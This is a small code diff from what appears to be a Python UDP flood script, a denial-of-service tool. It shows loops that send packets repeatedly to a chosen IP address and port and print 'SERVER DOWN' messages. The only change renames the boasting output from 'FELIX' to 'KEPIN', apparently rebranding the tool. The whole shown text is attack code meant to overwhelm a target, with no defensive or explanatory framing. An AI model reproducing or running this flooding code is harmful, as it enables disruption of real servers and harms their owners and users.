@@ -56,7 +56,7 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" PACKETS FROM FELIX!!!")
+			print(i +" PACKETS FROM KEPIN!!!")
 		except:
 			s.close()
 			print("[!] SERVER DOWN!!!")
@@ -70,7 +70,7 @@ def run2():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" PACKETS FROM FELIX!!!")
+			print(i +" PACKETS FROM KEPIN!!!")
 		except:
 			s.close()
 			print("[!] SERVER DOWN!!!")
